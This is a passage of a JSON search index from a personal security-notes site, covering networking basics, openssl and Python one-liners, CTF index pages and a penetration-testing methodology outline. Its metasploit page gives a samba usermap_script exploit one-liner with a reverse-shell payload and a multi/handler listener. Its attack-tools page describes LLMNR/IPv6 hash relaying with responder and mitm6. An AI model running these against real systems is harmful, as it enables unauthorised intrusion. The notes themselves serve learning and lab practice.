},
{
	"uri": "https://dev-hugo.justin-p.me/notes/networking/osi-model/",
	"title": "OSI Model",
	"tags": ["OSI Model"],
	"description": "OSI Model description.",
	"content": "OSI Model - Open Systems Interconnecting Model Please Do Not Throw Sausage Pizza Away\n   Layer number layer name Protocol data unit (PDU) What runs \u0026lsquo;on it\u0026rsquo; Function of layer     7 Application  HTTP, SMTP, SMB High-level APIs, including resource sharing, remote file access   6 Presentation Data AVI, GIF ,JPEG, MKV Translation of data between a networking service and an application; including character encoding, data compression and encryption/decryption   5 Session  Session management (sockets) Managing communication sessions, i.e. continuous exchange of information in the form of multiple back-and-forth transmissions between two nodes   4 Transport Segment (TCP) / Datagram (UDP)  Reliable transmission of data segments between points on a network, including segmentation, acknowledgement and multiplexing   3 Network Packet IP addresses, Routing Structuring and managing a multi-node network, including addressing, routing and traffic control   2 Data link Frame Switching, MAC addresses Reliable transmission of data frames between two nodes connected by a physical layer   1 Physical Bit Data cables, CAT5e, CAT6 Transmission and reception of raw bit streams over a physical medium    Protocol data unit Stands for \u0026ldquo;Protocol Data Unit.\u0026rdquo; A PDU is a specific block of information transferred over a network. It is often used in reference to the OSI model, since it describes the different types of data that are transferred from each layer.\n  Layer 1   Transmission and reception of raw bit streams over a physical medium.\n   Layer 2   Reliable transmission of data frames between two nodes connected by a physical layer.\n   Layer 3   Structuring and managing a multi-node network, including addressing, routing and traffic control.\n   Layer 4   Reliable transmission of data segments between points on a network, including segmentation, acknowledgement and multiplexing.\n   Layer 5   Managing communication sessions, i.e. continuous exchange of information in the form of multiple back-and-forth transmissions between two nodes.\n   Layer 6   Translation of data between a networking service and an application; including character encoding, data compression and encryption/decryption.\n   Layer 7   High-level APIs, including resource sharing, remote file access.\n  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/programming/php/",
	"title": "PHP",
	"tags": ["Programming"],
	"description": "PHP description.",
	"content": "PHP See github\n"
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/programming/powershell/",
	"title": "PowerShell",
	"tags": ["Programming"],
	"description": "PowerShell description.",
	"content": "PowerShell See github\n "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/programming/",
	"title": "Programming",
	"tags": ["Notes"],
	"description": "Programming description.",
	"content": "Programming   Bash   Bash scripting.\n   Docker-Compose   Docker-Compose YAML.\n   Dockerfile   A Dockerfile is a text document that contains all the commands a user could call on the command line to assemble an image.\n   Markdown   Markdown description.\n   MySQL   MySQL description.\n   Python   Python description.\n  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/programming/python/",
	"title": "Python",
	"tags": ["Programming"],
	"description": "Python description.",
	"content": "Python Oneliners HTTP Start a webserver that hosts the current pwd.\n   Python2 Python3     Python -m SimpleHTTPServer 8000 Python3 -m http.server 8000    FTP Start a ftp that hosts the current pwd.\n   Python2 Python3     Python -m pyftpdlib Python3 -m pyftpdlib    unicode character Print a unicode character\n   Python2 Python3     Python -c \u0026quot;print unichr(234)\u0026quot; Python3 -c \u0026quot;print(chr(234))\u0026quot;    Handystuff get current function name functionname = inspect.stack()[0][3]\r get callers name of current function functionname = inspect.stack()[1][3]\r "
},
{
	"uri": "https://dev-hugo.justin-p.me/guides/ubuntu-vps/",
	"title": "Ubuntu VPS",
	"tags": ["Guides"],
	"description": "Setup a &#39;publicly accessible&#39; Ubuntu VPS",
	"content": "Ubuntu VPS   00. Introduction   Introduction to this guide.\n   01. Adding users   Adding users using the commandline.\n   02. Managing of packages   Managing packages using the commandline.\n   03. File editor: vim   Editing files using the commandline.\n   04. UFW   Setting up a basic firewall files using the commandline.\n   05. SSH Keys   Generating and setting up SSH Keys.\n   06. Setup sshd   Hardening the SSH Deamon.\n   07. Unattended Upgrades   Automating security updates and reboots.\n   08. Fail2ban   Setting up a Fail2Ban, a package that will automatically ban brute forcing IPs.\n   09. Logwatch   Setting up Logwatch, a package that parses logs files on your system and sends over a report.\n   10. Sysctl Optimization   Linux sysctl.conf parameter tweaking to improve memory management, network security, network performance.\n  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/04-post-exploitation/",
	"title": "04. Post Exploitation",
	"tags": ["Post Exploitation"],
	"description": "Exploitation description.",
	"content": "Post Exploitation Basic Linux Privilege Escalation\n  activedirectory   activedirectory description.\n   encrypted password protected pdf   encrypted password protected pdf description.\n   encrypted password protected zip   encrypted password protected zip description.\n   hash identifier   hash identifier description.\n   hashcat   hashcat description.\n   post compromise recon   post compromise recon.\n   priv esc   priv esc description.\n   shell escaping   shell escaping description.\n   steal access tokens   steal access tokens.\n   unshadow   unshadow description.\n   wpadmin plugin upload   wpadmin plugin upload description.\n  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/03-exploitation/active-directory/",
	"title": "Active Directory",
	"tags": ["Active Directory"],
	"description": "Active Directory description.",
	"content": "Active Directory   Attack Tools   Tools of the attack.\n   IPv6 DNS Takeover   IPv6 DNS Takeover.\n   LLMNR and NBT-NS   LLMNR and NBT-NS.\n   SMB Relay   SMB Relay.\n   WPAD   WPAD description.\n  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/04-post-exploitation/active-directory/",
	"title": "activedirectory",
	"tags": ["ActiveDirectory"],
	"description": "activedirectory description.",
	"content": "activedirectory   credentialaccess   credentialaccess description.\n   powerview   powerview description.\n  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/03-exploitation/active-directory/attack-tools/",
	"title": "Attack Tools",
	"tags": ["Attack Tools"],
	"description": "Tools of the attack.",
	"content": "Attack Tools Attack Vectors/Strategies  At the start of the day or after lunch start up either  responder (llmnr) mitm6 (IPv6)   Run nessus/nmap scans to generate traffic  if scans take to long look for websites that are in scope.  Check for default creds on printers etc.  if we get in, check for Scan to Mail/SMB/FTP etc.       Start relaying LLMNR hashes during the end of the day    mitm6   mitm6 description.\n   ntlmrelayx   ntlmrelayx description.\n   psexec   psexec description.\n   responder   responder description.\n  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/networking/configs/",
	"title": "Configs",
	"tags": ["Networking"],
	"description": "Configs description.",
	"content": "Configs See github\n"
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/courses/",
	"title": "Courses",
	"tags": ["Notes"],
	"description": "Notes from cources I did.",
	"content": "Courses Notes from cources I did. See Github for the files.\n"
},
{
	"uri": "https://dev-hugo.justin-p.me/tags/ctfs/",
	"title": "CTFs",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/ctfs/",
	"title": "CTFs",
	"tags": ["Notes"],
	"description": "Notes and (semi-) Writeups of CTFs",
	"content": "CTFs   Graficom Spoorzoeker   A really simple CTF I made for internal use at a company I worked for.\n   HTB   Notes from HTB boxes/challanges\n   OverTheWire   OverTheWire description.\n   VulnHub   VulnHub description.\n   Vulnserver   Notes from the Vulnserver machine.\n  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/ctfs/graficomspoorzoeker/",
	"title": "Graficom Spoorzoeker",
	"tags": ["CTFs"],
	"description": "A really simple CTF I made for internal use at a company I worked for.",
	"content": "Graficom Spoorzoeker   Challanges   Challanges of the Graficom Spoorzoeker\n   Solutions   Solutions of the Graficom Spoorzoeker\n  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/ctfs/htb/",
	"title": "HTB",
	"tags": ["CTFs"],
	"description": "Notes from HTB boxes/challanges",
	"content": "HTB   Bashed   Notes from the Bashed machine on HTB.\n   Blue   Notes from the Blue machine on HTB.\n   Devel   Notes from the Devel machine on HTB.\n   Grandpa   Notes from the Grandpa machine on HTB.\n   Granny   Notes from the Granny machine on HTB.\n   Jerry   Notes from the Jerry machine on HTB.\n   Lame   Notes from the Lame machine on HTB.\n   Legacy   Notes from the Legacy machine on HTB.\n   Netmon   Notes from the Netmon machine on HTB.\n   Nibbles   Notes from the Nibbles machine on HTB.\n   Optimum   Notes from the Optimum machine on HTB.\n  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/ctfs/vulnhub/kioptrix/",
	"title": "Kioptrix",
	"tags": ["VulnHub"],
	"description": "Notes from the Kioptrix machines from Vulnhub.",
	"content": "kioptrix   Level 1   Notes from Kioptrix level 1 from Vulnhub.\n   Level 2   Notes from Kioptrix level 2 from Vulnhub.\n   Level 3   Notes from Kioptrix level 3 from Vulnhub.\n   Level 4   Notes from Kioptrix level 4 from Vulnhub.\n  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/networking/",
	"title": "Networking",
	"tags": ["Notes"],
	"description": "Networking description.",
	"content": "Networking It should be obvious that page is not a complete description of IP, UDP or TCP, etc!\nDedicated pages go more in depth.\nWhat is \u0026ldquo;IPv4\u0026rdquo; \u0026ldquo;IPv6\u0026rdquo;? The following is the \u0026ldquo;30 second\u0026rdquo; introduction to internet protocol (IP) - which is the primary way to send packets (\u0026ldquo;datagrams\u0026rdquo;) of information from one machine to another.\n\u0026ldquo;IP4\u0026rdquo;, or more precisely, \u0026ldquo;IPv4\u0026rdquo; is version 4 of the Internet Protocol that describes how to send packets of information across a network from one machine to another . Roughly 95% of all packets on the Internet today are IPv4 packets. A significant limitation of IPv4 is that source and destination addresses are limited to 32 bits (IPv4 was designed at a time when the idea of 4 billion devices connected to the same network was unthinkable - or at least not worth making the packet size larger)\nEach IPv4 packet includes a very small header - typically 20 bytes (more precisely, \u0026ldquo;octets\u0026rdquo;), that includes a source and destination address.\nConceptually the source and destination addresses can be split into two: a network number (the upper bits) and the lower bits represent a particular host number on that network.\nA newer packet protocol \u0026ldquo;IPv6\u0026rdquo; solves many of the limitations of IPv4 (e.g. makes routing tables simpler and 128 bit addresses).\nA machine can have an IPv6 address and an IPv4 address.\n\u0026ldquo;There\u0026rsquo;s no place like 127.0.0.1\u0026rdquo;! A special IPv4 address is 127.0.0.1 also known as localhost. Packets sent to 127.0.0.1 will never leave the machine; the address is specified to be the same machine.\nNotice that the 32 bits address is split into 4 octets i.e. each number in the dot notation can be 0-255 inclusive. However IPv4 addresses can also be written as an integer.\n\u0026hellip; and \u0026hellip; \u0026ldquo;There\u0026rsquo;s no place like 0:0:0:0:0:0:0:1?\u0026rdquo; The 128bit localhost address in IPv6 is 0:0:0:0:0:0:0:1 which can be written in its shortened form, ::1\nWhat is a port? To send a datagram (packet) to a host on the Internet using IPv4 (or IPv6) you need to specify the host address and a port. The port is an unsigned 16 bit number (i.e. the maximum port number is 65535).\nA process can listen for incoming packets on a particular port. However only processes with super-user (root) access can listen on ports \u0026lt; 1024. Any process can listen on ports 1024 or higher.\nAn often used port is port 80: Port 80 is used for unencrypted http requests (i.e. web pages). For example, if a web browser connects to http://www.bbc.com/, then it will be connecting to port 80.\nWhat is UDP? When is it used? UDP is a connectionless protocol that is built on top of IPv4 and IPv6. It\u0026rsquo;s very simple to use: Decide the destination address and port and send your data packet! However the network makes no guarantee about whether the packets will arrive. Packets (aka Datagrams) may be dropped if the network is congested. Packets may be duplicated or arrive out of order.\nA typical use case for UDP is when receiving up to date data is more important than receiving all of the data. For example, a game may send continuous updates of player positions. A streaming video signal may send picture updates using UDP.\nWhat is TCP? When is it used? TCP is a connection-based protocol that is built on top of IPv4 and IPv6 (and therefore can be described as \u0026ldquo;TCP/IP\u0026rdquo; or \u0026ldquo;TCP over IP\u0026rdquo;). TCP creates a pipe between two machines and abstracts away the low level packet-nature of the Internet: Thus, under most conditions, bytes sent from one machine will eventually arrive at the other end without duplication or data loss.\nTCP will automatically manage resending packets, ignoring duplicate packets, re-arranging out-of-order packets and changing the rate at which packets are sent.\nTCP\u0026rsquo;s three way handshake is known as SYN, SYN-ACK, and ACK. The diagram on this page helps with understanding the TCP handshake.\nMost services on the Internet today (e.g. a web service) use TCP because it hides the complexity of lower, packet-level nature of the Internet.\n"
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/ctfs/overthewire/",
	"title": "OverTheWire",
	"tags": ["OverTheWire"],
	"description": "OverTheWire description.",
	"content": "OverTheWire   Bandit   Notes from Bandit challanges.\n   Natasa   Notes from Bandit Natasa.\n  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/ctfs/vulnhub/",
	"title": "VulnHub",
	"tags": ["CTFs"],
	"description": "VulnHub description.",
	"content": "VulnHub   Fristileaks   Notes from the Fristileaks machine from Vulnhub.\n   Kioptrix   Notes from the Kioptrix machines from Vulnhub.\n   Pwnlab   Notes from the Pwnlab machine from Vulnhub.\n   Stapler   Notes from the Stapler machine from Vulnhub.\n   Vulnix   Notes from the Vulnix machine from Vulnhub.\n  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/ctfs/vulnserver/",
	"title": "Vulnserver",
	"tags": ["CTFs"],
	"description": "Notes from the Vulnserver machine.",
	"content": "Vulnserver   TRUN   Notes from the TRUN command on the Vulnserver machine.\n  "
},
{
	"uri": "https://dev-hugo.justin-p.me/tools/00-c2-frameworks/",
	"title": "&#39;C2 Frameworks&#39;",
	"tags": ["C2 Frameworks"],
	"description": "C2 Frameworks description.",
	"content": "C2 Frameworks   empire   empire description.\n   metasploit   metasploit description.\n  "
},
{
	"uri": "https://dev-hugo.justin-p.me/tools/00-forensic/",
	"title": "&#39;Forensic&#39;",
	"tags": ["Forensic"],
	"description": "forensic description.",
	"content": "forensic   exiftool   exiftool description.\n   ssh sha256 to public key   ssh sha256 to public key description.\n   usbrip   usbrip description.\n  "
},
{
	"uri": "https://dev-hugo.justin-p.me/tools/00-steganography/",
	"title": "&#39;Steganography&#39;",
	"tags": ["Steganography"],
	"description": "Steganography description.",
	"content": "steganography   binwalk   binwalk description.\n   foremost   foremost description.\n   steghide   steghide description.\n  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/01-reconnaissance/",
	"title": "01. Reconnaissance",
	"tags": ["Reconnaissance"],
	"description": "Find whats out there before you even start.",
	"content": "Reconnaissance   Certificate Transparency Logs   The art of Credential Gathering.\n   Credential Gathering   The art of Credential Gathering.\n   DNS Recon   DNS Recon, if you don\u0026#39;t know where stuff is its gonna get hard to hack it.\n   E-Mail Gathering   If you know e-mail addresses you know naming conventions and possible even passwords.\n   Google Dorking   Ask the almight Google Machine. It. Known. All.\n   Identify Technologies   Find out what services they are using.\n   Misconfigured Cloud Assets   Misconfigured Cloud Assets.\n   phising   phising.\n   public key disclosure   public key disclosure description.\n   Shodan   Use the power of OSINT.\n   Social Media   Use the power of OSINT.\n  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/02-scanning-and-enumeration/",
	"title": "02. Scanning and Enumeration",
	"tags": ["Scanning and Enumeration"],
	"description": "SCAN ALL THE THINGS!",
	"content": "Scanning and Enumeration   Discover Open Ports   SCAN ALL THE THINGS!\n   Finger   Finger me daddy.\n   NFS   NFS\n   searchsploit   searchsploit description.\n   smb   smb description.\n   smtp   smtp description.\n   Web   Web\n  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/03-exploitation/",
	"title": "03. Exploitation",
	"tags": ["Exploitation"],
	"description": "Life, Learn and Try Harder.",
	"content": "03 Exploitation   Active Directory   Active Directory description.\n   Credential Stuffing   Stuff those POST fields.\n   Hydra   Hydra description.\n   Password Spraying   Password Spraying description.\n   Redis   Redis tomfoolery.\n   s3 bucket fun       Shells   Not the sea kind\n   SQL Injection   SQL Injection description.\n   Web Servers   Web servers description.\n  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/05-cleanup/",
	"title": "05. Cleanup",
	"tags": ["Cleanup"],
	"description": "Cleanup description.",
	"content": "Cleanup  "
},
{
	"uri": "https://dev-hugo.justin-p.me/tags/cleanup/",
	"title": "Cleanup",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "https://dev-hugo.justin-p.me/tags/commands/",
	"title": "Commands",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "https://dev-hugo.justin-p.me/commands/",
	"title": "Commands",
	"tags": ["Main Page"],
	"description": "Commands",
	"content": "Unix   Unix   Unix commands\n  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/02-scanning-and-enumeration/discover-open-ports/",
	"title": "Discover Open Ports",
	"tags": ["Scanning and Enumeration"],
	"description": "SCAN ALL THE THINGS!",
	"content": "Discover Open Ports netdiscover netdiscover -r 192.168.1.0/24  masscan scan all ports masscan 10.11.0.0/16  scan port range masscan 10.11.0.0/16 -p22-25 --rate 1000  Scan \u0026lsquo;n\u0026rsquo; Number of nmap‘s Top Ports masscan 10.11.0.0/16 ‐‐top-ports 100 --rate 1000  Output to file -oX filename: Output to filename in XML. -oG filename: Output to filename in Grepable format. -oJ filename: Output to filename in JSON format.  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/exploit-development/",
	"title": "Exploit Development",
	"tags": ["Exploit Development"],
	"description": "Bufferoverflows and the like.",
	"content": "exploit development   Buffer Overflow   Buffer Overflowaaaaaaaaaaaaaaaaaaaaaaaaaa.\n  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/",
	"title": "Hacking Methodology",
	"tags": ["Notes"],
	"description": "Hacking Methodology, what, how and when todo what.",
	"content": "Hacking Methodology   01. Reconnaissance   Find whats out there before you even start.\n   02. Scanning and Enumeration   SCAN ALL THE THINGS!\n   03. Exploitation   Life, Learn and Try Harder.\n   04. Post Exploitation   Exploitation description.\n   05. Cleanup   Cleanup description.\n  "
},
{
	"uri": "https://dev-hugo.justin-p.me/tools/00-c2-frameworks/metasploit/",
	"title": "metasploit",
	"tags": ["C2 Frameworks"],
	"description": "metasploit description.",
	"content": "metasploit Install Usage msfconsole\r Examples init database msfdb init\r create new workspace workspace -a [name]\r switch to workspace workspace [name]\r run commands without interactive shell msfconsole -x \u0026quot;use exploit/multi/samba/usermap_script;\\\rset RHOST 172.16.194.172;\\\rset PAYLOAD cmd/unix/reverse;\\\rset LHOST 172.16.194.163;\\\rrun\u0026quot;\r Multi-handler for reverse shell use exploit/multi/handler\rset LHOST 192.168.88.128\rset LPORT 4444\rset ExitOnSession False\r netcat/bash reverse set PAYLOAD linux/x86/shell/reverse_tcp\r run in the background run -j\r Also see  Github Project metasploit-unleashed  "
},
{
	"uri": "https://dev-hugo.justin-p.me/tools/openssl/",
	"title": "openssl",
	"tags": ["Openssl"],
	"description": "openssl description.",
	"content": "openssl Install apt install openssl\r Usage openssl COMMAND OPTIONS ARGUMENTS\r Examples General Generate a new private key and Certificate Signing Request openssl req -out CSR.csr -new -newkey rsa:2048 -nodes -keyout privateKey.key\r Generate a self-signed certificate openssl req -x509 -sha256 -nodes -days 365 -newkey rsa:2048 -keyout privateKey.key -out certificate.crt\r Generate a certificate signing request (CSR) for an existing private key openssl req -out CSR.csr -key privateKey.key -new\r Generate a certificate signing request based on an existing certificate openssl x509 -x509toreq -in certificate.crt -out CSR.csr -signkey privateKey.key\r Remove a passphrase from a private key openssl rsa -in privateKey.pem -out newPrivateKey.pem\r Generate DH params with a given length openssl dhparam -out dhparams.pem [bits]\r Checking Check a Certificate Signing Request (CSR) openssl req -text -noout -verify -in CSR.csr\r Check a private key openssl rsa -in privateKey.key -check\r Check length of private key openssl rsa -in mfa_HzVQK4-key.pem -text -noout | grep \u0026quot;Private-Key\u0026quot;\r Check a certificate openssl x509 -in certificate.crt -text -noout\r Check a PKCS#12 file (.pfx or .p12) openssl pkcs12 -info -in keyStore.p12\r Debugging Check an MD5 hash of the public key to ensure that it matches with what is in a CSR or private key openssl x509 -noout -modulus -in certificate.crt | openssl md5\ropenssl rsa -noout -modulus -in privateKey.key | openssl md5\ropenssl req -noout -modulus -in CSR.csr | openssl md5\r Measure speed of various security algorithms openssl speed rsa2048\ropenssl speed ecdsap256\r Converting Convert a DER file (.crt .cer .der) to PEM openssl x509 -inform der -in certificate.cer -out certificate.pem\r Convert a PEM file to DER openssl x509 -outform der -in certificate.pem -out certificate.der\r Convert a PKCS#12 file (.pfx .p12) containing a private key and certificates to PEM openssl pkcs12 -in keyStore.pfx -out keyStore.pem -nodes\r Convert a PEM certificate file and a private key to PKCS#12 (.pfx .p12) openssl pkcs12 -export -out certificate.pfx -inkey privateKey.key -in certificate.crt -certfile CACert.crt\r List cipher suites openssl ciphers -v\r check certificate revocation status First, retrieve the certificate from a remote server:\nopenssl s_client -connect example.com:443 2\u0026gt;\u0026amp;1 \u0026lt; /dev/null | sed -n '/-----BEGIN/,/-----END/p' \u0026gt; cert.pem\r You’d also need to obtain intermediate CA certificate chain. Use -showcerts flag to show full certificate chain, and manually save all intermediate certificates to chain.pem file:\nopenssl s_client -showcerts -host example.com -port 443 \u0026lt;/dev/null\r Read OCSP endpoint URI from the certificate:\nopenssl x509 -in cert.pem -noout -ocsp_uri\r Request a remote OCSP responder for certificate revocation status using the URI from the above step (e.g. http://ocsp.stg-int-x1.letsencrypt.org).\nopenssl ocsp -header \u0026quot;Host\u0026quot; \u0026quot;ocsp.stg-int-x1.letsencrypt.org\u0026quot; -issuer chain.pem -VAfile chain.pem -cert cert.pem -text -url http://ocsp.stg-int-x1.letsencrypt.org\r "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/03-exploitation/shells/",
	"title": "Shells",
	"tags": ["Exploitation"],
	"description": "Not the sea kind",
	"content": "Shell   msfvenom   msfvenom description.\n   payloads   payloads description.\n  "
},
{
	"uri": "https://dev-hugo.justin-p.me/commands/unix/",
	"title": "Unix",
	"tags": ["Commands"],
	"description": "Unix commands",
	"content": "Unix   awk   awk is a complete pattern scanning and processing language, it is most commonly used as a Unix command-line filter to reformat the output of other commands.\n   base64   base64 encode/decode data and print to standard output.\n   bzip2   a block-sorting file compressor.\n   cron   daemon to execute scheduled commands.\n   curl   transfer a URL.\n   cut   remove sections from each line of files.\n   file   determine file type.\n   find   search for files in a directory hierarchy.\n   grep   print lines matching a pattern.\n   gzip gunzip zcat   compress or expand files.\n   md5sum   compute and check MD5 message digest.\n   random   random description.\n   rev   reverse lines characterwise.\n   scp   secure copy (remote file copy program).\n   sed   stream editor for filtering and transforming text.\n   sort   sort lines of text files.\n   strings   strings description.\n   tar   an archiving utility.\n   tmux   tmux description.\n   touch   change file timestamps.\n   tr   translate or delete characters.\n   uniq   report or omit repeated lines.\n   xxd   make a hexdump or do the reverse.\n  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/z_private/",
	"title": "Z_Private",
	"tags": ["Notes"],
	"description": "Private notes",
	"content": "Private  "
},
{
	"uri": "https://dev-hugo.justin-p.me/categories/",
	"title": "Categories",
	"tags": [],
	"description": "",
	"content": ""
}]